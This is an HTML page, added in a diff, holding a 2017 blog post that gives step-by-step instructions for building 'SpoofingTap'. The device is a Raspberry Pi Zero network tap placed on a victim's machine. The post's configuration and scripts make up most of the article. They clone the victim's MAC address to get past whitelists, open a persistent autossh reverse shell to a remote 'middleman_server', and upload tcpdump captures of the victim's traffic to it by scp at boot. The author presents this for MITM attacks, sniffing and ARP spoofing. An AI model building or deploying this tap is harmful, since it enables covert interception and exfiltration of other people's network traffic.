@@ -1,0 +1,429 @@
+<!doctype html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="generator" content="Jekyll">
+    <link rel="license" href="LICENSE">
+
+    <meta name="application-name" content="Giovanni's Blog">
+    <meta name="theme-color" content="">
+    <link rel="archives" href="http://localhost:4000/archives/">
+
+    <meta name="robots" content="index,follow"> <!-- All Search Engines -->
+    <meta name="googlebot" content="index,follow"><!-- Google Specific    -->
+
+    <link rel="stylesheet" href="https://unpkg.com/purecss@2.0.3/build/pure-min.css">
+    <link rel="stylesheet" href="https://unpkg.com/purecss@2.0.3/build/grids-responsive-min.css">
+    <link rel="stylesheet" href="/assets/main.css">
+    <link rel="stylesheet" href="/assets/code.css">
+    <script src="https://kit.fontawesome.com/e9dddf84a6.js" crossorigin="anonymous"></script><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>SpoofingTap - a network tap with automatic MAC address spoofing | Giovanni’s Blog</title>
+<meta name="generator" content="Jekyll v4.0.1" />
+<meta property="og:title" content="SpoofingTap - a network tap with automatic MAC address spoofing" />
+<meta name="author" content="Giovanni De Costanzo" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="In this article we will see how to implement, starting from a Raspberry Pi Zero, a particular network tap that takes the same victim machine’s Internet connection to open a reverse shell and realize various MITM attacks." />
+<meta property="og:description" content="In this article we will see how to implement, starting from a Raspberry Pi Zero, a particular network tap that takes the same victim machine’s Internet connection to open a reverse shell and realize various MITM attacks." />
+<link rel="canonical" href="http://localhost:4000/spoofingtap" />
+<meta property="og:url" content="http://localhost:4000/spoofingtap" />
+<meta property="og:site_name" content="Giovanni’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2017-02-21T00:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="SpoofingTap - a network tap with automatic MAC address spoofing" />
+<meta name="twitter:site" content="@" />
+<meta name="twitter:creator" content="@Giovanni De Costanzo" />
+<script type="application/ld+json">
+{"dateModified":"2017-02-21T00:00:00+01:00","datePublished":"2017-02-21T00:00:00+01:00","url":"http://localhost:4000/spoofingtap","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/spoofingtap"},"author":{"@type":"Person","name":"Giovanni De Costanzo"},"description":"In this article we will see how to implement, starting from a Raspberry Pi Zero, a particular network tap that takes the same victim machine’s Internet connection to open a reverse shell and realize various MITM attacks.","@type":"BlogPosting","headline":"SpoofingTap - a network tap with automatic MAC address spoofing","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Giovanni's Blog" /><link rel="alternate" type="application/rss+xml" href="http://localhost:4000/feed.xml">
+</head><body>
+
+    <div id="layout" class="pure-g"><aside class="sidebar pure-u-1 pure-u-md-1-4">
+    <div class="sidebar-info">
+        <a href="/">
+            <span hidden>Giovanni's Blog
+                Header Image</span>
+            <img class="brand-photo" src="http://localhost:4000/assets/profile_pic.jpg" alt="Photo of Giovanni De Costanzo"/>
+        </a>
+        <h1 class="brand-title">
+            <a href="/">Giovanni's Blog</a>
+        </h1>
+        <h2 class="brand-tagline">This is the personal website of Giovanni De Costanzo. </h2>
+
+        <nav class="nav">
+            <ul class="nav-list">
+                <li class="nav-item">
+                    <a class="pure-button" href="http://localhost:4000">Home</a>
+                </li>
+                <li class="nav-item">
+                    <a class="pure-button" href="http://localhost:4000/about">About Me</a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+</aside><div class="content pure-u-1 pure-u-md-3-4">
+            <div class="md-display">
+                <h1>
+                    <a class="jekyll-header" href="/">Welcome to Giovanni's Blog</a>
+                </h1><div class="menu">
+    <div class="about">
+        <a href="/about">
+            <i class="fas fa-signature"></i>
+            About
+        </a>
+    </div>
+    <div class="hashtags">
+        <a href="/tags">
+            <i class="fas fa-hashtag"></i>
+            Tags
+        </a>
+    </div>
+    <div class="categories">
+        <a href="/categories">
+            <i class="far fa-folder-open"></i>
+            Categories
+        </a>
+    </div>
+    <div class="archive">
+        <a href="/archive">
+            <i class="fas fa-archive"></i>
+            Archive
+        </a>
+    </div>
+</div><div id="search">
+    <label>
+        <span class="search-icon">🔎</span>
+        <input autocomplete="off" id="search-input" oninput="changeResultContainerDisp(this.value)" placeholder="Search all articles..." type="text"/>
+    </label>
+
+    <ul id="results-container" style="display: none"></ul>
+</div>
+<script src="/assets/simple-jekyll-search.js"></script>
+<script>
+    function changeResultContainerDisp(val) {
+        if (val) {
+            document
+                .getElementById("results-container")
+                .style
+                .display = "block";
+            document.getElementById("search-input").addEventListener("blur", function () {
+                document.addEventListener("click", function (event) {
+                    var isClickInside = document.getElementById("results-container").contains(event.target);
+                    if (! isClickInside) {
+                        document
+                            .getElementById("results-container")
+                            .style
+                            .display = "none";
+                    }
+                })
+            })
+        } else {
+            document
+                .getElementById("results-container")
+                .style
+                .display = "none";
+        }
+    }
+    var sjs = SimpleJekyllSearch({
+        searchInput: document.getElementById("search-input"),
+        resultsContainer: document.getElementById("results-container"),
+        json: "/search.json",
+        searchResultTemplate: "<li class='search_res' style='list-style: none;'><a href='http://localhost:4000{url}' color: #555555;'><p><strong>></strong> {title}</p></a></li>",
+        noResultsText: "No results found. Try another search.",
+        fuzzy: false,
+        limit: 5
+    })
+</script></div>
+            <div>
+                <article class="post-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+    <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">SpoofingTap - a network tap with automatic MAC address spoofing</h2><p><time datetime="2017-02-21T00:00:00+01:00" itemprop="datePublished">
+        Feb 21, 2017
+    </time>&#8239;
+    <span itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">By: Giovanni De Costanzo</span></span>&#8239;|&#8239;<a href="/tags/#InternetofThings">#InternetofThings</a> &#8239;<a href="/tags/#man-in-the-middle">#man-in-the-middle</a> &#8239;<a href="/tags/#MITM">#MITM</a> &#8239;<a href="/tags/#networking">#networking</a> &#8239;<a href="/tags/#networktap">#networktap</a> &#8239;<a href="/tags/#Raspberry">#Raspberry</a> &#8239;<a href="/tags/#spoofing">#spoofing</a> &#8239;<a href="/tags/#SpoofingTap">#SpoofingTap</a> &#8239;<a href="/tags/#tcpdump">#tcpdump</a> &#8239;</p></header>
+
+    <div articlebody" class="post-body itemprop=">
+        <p>In this article we will see how to implement, starting from a Raspberry Pi Zero, a particular network tap that takes the same victim machine’s Internet connection to open a reverse shell and realize various MITM attacks.</p>
+
+<p>Create a network tap on a Linux machine is quite simple; you only need two Ethernet interfaces and configure a virtual bridge between them. This type of tap network is very interesting because, as I mentioned earlier, is able to use the same victim’s network to connect to the Internet. You could, for example, use the connection to send to a remote server a copy of traffic captured with tcpdump. A simple example made on Raspberry Pi and available online, is <a href="https://github.com/botherder/ntap">NTap</a>.</p>
+
+<figure>
+<img data-width="1291" data-height="479" src="assets/posts/spoofingtap1.jpg" />  
+</figure>
+
+<p>However, in some network infrastructures with specific security policies (eg. in a company), often MAC address whitelists are defined to allow access only to authorized machines. In these circumstances, a network tap made with a virtual bridge, continue to provide to the victim machine network access, but would not be able to connect to the same, as it occurs in the network with a MAC address not recognized. The only way to access the network, is to spoof the MAC address of the victim, which is present in the whitelist.</p>
+
+<figure>
+<img data-width="1291" data-height="479" src="assets/posts/spoofingtap2.png" />  
+</figure>
+
+<p>SpoofingTap is based on this idea, and it was made on a Raspberry Pi Zero for several reasons:</p>
+
+<ul>
+  <li>small size and portability</li>
+  <li>low power consumption</li>
+  <li>affordable cost ($5 for the only board)</li>
+</ul>
+
+<p>The Pi Zero however has no network interfaces then, in addition to a microSD where to install the OS, you need two Ethernet network adapters. In this regard we have some alternatives:</p>
+
+<ul>
+  <li>Use a USB Ethernet Hub, which will be connected in cascade a second Ethernet USB adapter.</li>
+  <li>Use a Micro-USB Ethernet adapter and take advantage of the GPIO interface to connect a second Ethernet controller chip based on the economic enc28j60 (PiJack). This solution has the advantage of having a more compact device, however, it limits the connection speed to 10Mbps.</li>
+  <li>Use a slightly more expensive Ethernet + USB shield (available here), to which we will add a second USB Ethernet adapter. This latter alternative, although has a higher cost, is to be considered the best; in fact it allows us to make the device more compact and at the same time to maintain a 100Mbps link speed.
+<em>(I got to get in touch with the person that produces the shield, to test the feasibility of a version with two Ethernet ports 100Mbps. The change is possible however, for reasons of cost, the producer would be willing to implement it only if there will be a good number of requests.)</em></li>
+</ul>
+
+<figure>
+<img data-width="1291" data-height="479" src="assets/posts/spoofingtap3.png" />  
+</figure>
+
+<p>Once you’ve connected the two network interfaces, which we call the <b>eth0</b> and <b>eth1</b>, you must configure the operating system (Raspbian in our case).</p>
+
+<p><br />
+<b>STEP 1</b>. Configure the network interfaces by editing the file <em>/etc/network/interfaces</em> as follows:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>auto eth0
+allow-hotplug eth0
+iface eth0 inet static
+        address 1.0.0.1
+        netmask 255.255.255.0
+
+auto eth1
+allow-hotplug eth0
+iface eth0 inet manual
+</code></pre></div></div>
+
+<p>The interface eth0 is configured with a static ip address that will be seen by the victim machine as a gateway. The interface eth1 will instead be the one connected to the external network.</p>
+
+<p><br />
+<b>STEP 2</b>. We define the iptables rules to forward traffic from the interface eth0 to eth1 and enable ip forwarding on the system.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Set rules in iptables
+sudo iptables -A FORWARD -o eth1 -i eth0 -s 1.0.0.0/24 -m conntrack --ctstate NEW -j ACCEPT
+sudo iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
+sudo iptables -t nat -F POSTROUTING
+sudo iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE
+
+# Save iptables rules
+sudo iptables-save &gt; /etc/iptables.sav
+
+# Edit /etc/sysctl.conf and uncomment:
+net.ipv4.ip_forward=1
+</code></pre></div></div>
+
+<p><br />
+<b>STEP 3</b>. We configure dnsmasq to assign an IP address to the victim machine when it is connected to the eth0 port on tap.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># DHCP/DNS server
+sudo apt-get install dnsmasq
+sudo /etc/init.d/dnsmasq stop
+
+#backup of default conf
+sudo cp /etc/dnsmasq.conf /etc/dnsmasq.conf-backup
+
+# Edit /etc/dnsmasq.conf and add the following two lines:
+interface=eth0
+dhcp-range=1.0.0.2,1.0.0.50,72h
+</code></pre></div></div>
+
+<p><br />
+<b>STEP 4</b>. Add the following commands to /etc/rc.local to run at system boot.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Edit /etc/rc.local and add the following lines before the "exit 0" line:
+iptables-restore &lt; /etc/iptables.sav
+/etc/init.d/dnsmasq start
+</code></pre></div></div>
+
+<p><br />
+<b>STEP 5</b>. Configure the script for automatic spoofing MAC address of the victim. So, the interface eth1 will occur on the network with the MAC address of the victim.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Install ifplugstatus to get status of ethernet devices
+sudo apt-get install ifplugd
+</code></pre></div></div>
+<p>We create the file /etc/spoofing_script.sh with the following contents:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="c"># When Pi Zero starts, eth0 must be connected to the victim's machine</span>
+<span class="c"># eth1 must be connected to the router/external network</span>
+
+<span class="c"># Steal the MAC address of victim's machine connected to eth0</span>
+<span class="nv">MAC_ADDR</span><span class="o">=</span><span class="si">$(</span>arp <span class="nt">-an</span> <span class="nt">-i</span> eth0 | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f</span> 4<span class="si">)</span>
+<span class="k">while</span> <span class="o">[</span> <span class="o">!</span> <span class="sb">`</span><span class="nb">echo</span> <span class="nv">$MAC_ADDR</span> | egrep <span class="s2">"^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$"</span><span class="sb">`</span> <span class="o">]</span><span class="p">;</span> <span class="k">do
+	</span><span class="nv">MAC_ADDR</span><span class="o">=</span><span class="si">$(</span>arp <span class="nt">-an</span> <span class="nt">-i</span> eth0 | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f</span> 4<span class="si">)</span>
+<span class="k">done
+</span><span class="nb">echo</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">date</span><span class="si">)</span><span class="s2"> MAC address copied: </span><span class="nv">$MAC_ADDR</span><span class="se">\n</span><span class="s2">"</span>
+
+
+<span class="c"># Spoof the MAC address copied on eth1 interface</span>
+ip <span class="nb">link set </span>dev eth1 down
+ip <span class="nb">link set </span>dev eth1 address <span class="nv">$MAC_ADDR</span>
+ip <span class="nb">link set </span>dev eth1 up
+<span class="nb">echo</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">date</span><span class="si">)</span><span class="s2"> MAC address spoofed: </span><span class="nv">$MAC_ADDR</span><span class="s2">"</span>
+
+<span class="c"># LED flashing signaling the end of spoofing operation</span>
+<span class="nv">counter</span><span class="o">=</span>0
+<span class="k">while</span> <span class="o">[</span> <span class="nv">$counter</span> <span class="nt">-lt</span> 4 <span class="o">]</span><span class="p">;</span> <span class="k">do
+        </span><span class="nb">echo </span>1 <span class="o">&gt;</span> /sys/class/leds/led0/brightness
+        <span class="nb">sleep </span>0.2
+        <span class="nb">echo </span>0 <span class="o">&gt;</span> /sys/class/leds/led0/brightness
+        <span class="nb">sleep </span>0.2
+        <span class="nv">counter</span><span class="o">=</span><span class="si">$(</span><span class="nb">expr</span> <span class="nv">$counter</span> + 1<span class="si">)</span>
+<span class="k">done</span>
+</code></pre></div></div>
+
+<p>Give execute permission to the script you just created and add it to /etc/rc.local  to run at boot.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#add execution permission
+sudo chmod +x /etc/spoofing_script.sh
+
+# Edit /etc/rc.local and add the following lines before the "exit 0" line:
+/bin/sh /etc/spoofing_script.sh &gt;&gt; /home/pi/log_spoofing.txt
+</code></pre></div></div>
+
+<p><br />
+<b>STEP 6</b>. We configure the tap for the automatic opening of a persistent reverse shell. You will need to have a remote server running with SSH service listening on port 2222 (in this way we make sure not to use a filtered reserved port).</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Install Autossh
+sudo apt-get install autossh
+	
+# Get a shell as root
+sudo su
+
+# Execute ssh-keygen command
+ssh-keygen
+
+# Enter the path when requested and leave empty passphrase (output sample below)
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa): */root/.ssh/nopwd*
+Enter passphrase (empty for no passphrase): *leave empty*
+Enter same passphrase again: *leave empty*
+
+# Copy the generated public key on your middleman server (replace "user" and "middleman_server" with your username and middleman ssh server)
+ssh-copy-id -i .ssh/nopwd.pub -p 2222 user@middleman_server
+
+#Edit /etc/rc.local and add the following line before the "exit 0" line (replace "user" and "middleman_server" with your username and middleman ssh server):
+autossh -M 10984 -N -f -o "PubkeyAuthentication=yes" -o "PasswordAuthentication=no" -i /root/.ssh/nopwd -R 6666:localhost:22 user@middleman_server -p 2222 &amp;
+
+# Reboot the system
+reboot -h now
+
+# Execute this command on your middleman_server to test
+ssh -p 6666 pi@127.0.0.1
+</code></pre></div></div>
+
+<p><br />
+<b>STEP 7</b>. We can set up a script that automatically send to our remote server a signed copy of the traffic captured with tcpdump. The signature assures us integrity, authenticity and non-repudiation of the captured traffic.</p>
+
+<p>First, we generate the keys and install necessary tools:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Key generation
+sudo openssl req -nodes -x509 -sha256 -newkey rsa:4096 -keyout "SpoofingTap.key" -out "SpoofingTap.crt" -days 365 -subj "/C=IT/ST=Italia/L=Napoli/O=Private/OU=IT Dept/CN=SpoofingTap"
+
+#Subsequent verification of the file signed with the key
+openssl dgst -sha256 -verify  &lt;(openssl x509 -in "SpoofingTap.crt"  -pubkey -noout) -signature dump.pcap.sha256 dump.pcap
+
+#install tcpdump and inotify-tools
+sudo apt-get install tcpdump inotify-tools
+</code></pre></div></div>
+
+<p>Then we define the script to automatically upload captured traffic on the server. Create the file /etc/mirroring.sh with the following content:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nb">mkdir</span> /tmp/dumps
+<span class="nb">mkdir</span> /tmp/checksums
+
+<span class="nv">filename</span><span class="o">=</span><span class="s2">""</span>
+
+<span class="c">#Listener for new dump files </span>
+inotifywait <span class="nt">--format</span> <span class="s1">'%f'</span> <span class="nt">-m</span> <span class="nt">-r</span> <span class="nt">-e</span> create <span class="s2">"/tmp/dumps"</span> | <span class="k">while </span><span class="nb">read </span>f
+
+<span class="k">do
+        if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$filename</span><span class="s2">"</span> <span class="o">!=</span> <span class="s2">""</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+                <span class="c">#sign the new dump file</span>
+                openssl dgst <span class="nt">-sha256</span> <span class="nt">-sign</span> <span class="s2">"/home/pi/SpoofingTap.key"</span> <span class="nt">-out</span> <span class="s2">"/tmp/checksums/</span><span class="nv">$filename</span><span class="s2">.sha256"</span> <span class="s2">"/tmp/dumps/</span><span class="nv">$filename</span><span class="s2">"</span>
+                
+                <span class="c">#Upload on the server of file dump and its sign</span>
+                scp <span class="nt">-P</span> 2222 <span class="nt">-i</span> /root/.ssh/nopwd <span class="s2">"/tmp/checksums/</span><span class="nv">$filename</span><span class="s2">.sha256"</span> user@middlemad_server:/home/user/checksums <span class="o">&amp;&amp;</span>
+                scp <span class="nt">-P</span> 2222 <span class="nt">-i</span> /root/.ssh/nopwd <span class="s2">"/tmp/dumps/</span><span class="nv">$filename</span><span class="s2">"</span> user@middleman_server:/home/user/dumps <span class="o">&amp;&amp;</span>
+                
+                <span class="c">#Delete file on Raspberry’s disk</span>
+                <span class="nb">rm</span> <span class="s2">"/tmp/checksums/</span><span class="nv">$filename</span><span class="s2">.sha256"</span>
+                <span class="nb">rm</span> <span class="s2">"/tmp/dumps/</span><span class="nv">$filename</span><span class="s2">"</span>
+        <span class="k">fi
+        </span><span class="nv">filename</span><span class="o">=</span><span class="nv">$f</span>
+<span class="k">done</span> &amp;
+
+<span class="c">#start tcpdump with log rotate every 10 seconds</span>
+tcpdump <span class="nt">-i</span> eth0 <span class="nt">-s</span> 0 <span class="nt">-G</span> 10 <span class="nt">-w</span> <span class="s1">'/tmp/dumps/trace_%Y-%m-%d_%H:%M:%S.pcap'</span> &amp;
+</code></pre></div></div>
+
+<p>Add execute permissions and put the script in /etc/rc.local to run at boot:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#add execution permission
+sudo chmod +x /etc/mirroring.sh
+
+#Edit /etc/rc.local and add the following lines before the "exit 0" line:
+/bin/sh /etc/mirroring.sh
+</code></pre></div></div>
+
+<p>At this point we have our tap accessible via SSH remotely, and from which we will be able to launch various MITM attacks such as sniffing, DNS spoofing, pharming, etc. In addition, having remote access to the internal network, you can also perform network scans, ARP spoofing attacks, and much more.</p>
+
+<p><br />
+<b><em>Note</em></b>: Unlike the network tap made with virtual bridge, this will no longer be transparent. In fact, by doing a traceroute from the inside, you will see that the traffic passes through an additional node, which is our gateway. However, from the outside will not be detectable because the tap comes up with the same MAC address of the victim machine.
+<br />
+<br /></p>
+
+    </div><div id="author">
+    <h3>About
+        Giovanni De Costanzo</h3>
+    <img src="assets/author-pic.png" alt="Photo of Giovanni De Costanzo"/>
+    <p>My name is Giovanni De Costanzo and I'm a Sr.Research Engineer at Malwarebytes. I'm a geek, passionate about all the tech world since early age.</p>
+</div><a class="u-url" href="/spoofingtap" hidden></a>
+</article><hr/>
+
+<footer class="footer">
+    <div class="pure-menu pure-menu-horizontal">
+        <ul>
+            <li class="pure-menu-item">
+                <a class="pure-menu-link" href="/">
+                    <i class="fas fa-home"></i>
+                    <span class="md-display">Home</span>
+                </a>
+            </li>
+            <li class="pure-menu-item">
+                <a class="pure-menu-link" href="https://www.linkedin.com/in/giovanni-de-costanzo-54b6b083/">
+                    <i class="fab fa-linkedin"></i>
+                    <span class="md-display">Linkedin</span>
+                </a>
+            </li>
+            <li class="pure-menu-item">
+                <a class="pure-menu-link" href="https://github.com/gdecostanzo">
+                    <i class="fab fa-github"></i>
+                    <span class="md-display">GitHub</span>
+                </a>
+            </li>
+            <li class="pure-menu-item">
+                <a class="pure-menu-link" href="mailto:mail@giovannidecostanzo.it">
+                    <i class="fas fa-paper-plane"></i>
+                    <span class="md-display">E-mail</span>
+                </a>
+            </li>
+            <li class="pure-menu-item">
+                <a class="pure-menu-link" href="https://www.facebook.com/giovanni.decostanzo">
+                    <i class="fab fa-facebook"></i>
+                    <span class="md-display">Facebook</span>
+                </a>
+            </li>
+            <li class="pure-menu-item">
+                <a class="pure-menu-link" href="https://www.instagram.com/g.decostanzo/">
+                    <i class="fab fa-instagram"></i>
+                    <span class="md-display">Instagram</span>
+                </a>
+            </li>
+        </ul>
+    </div>
+</footer></div>
+        </div>
+    </div>
+
+</body>
+
+</html>
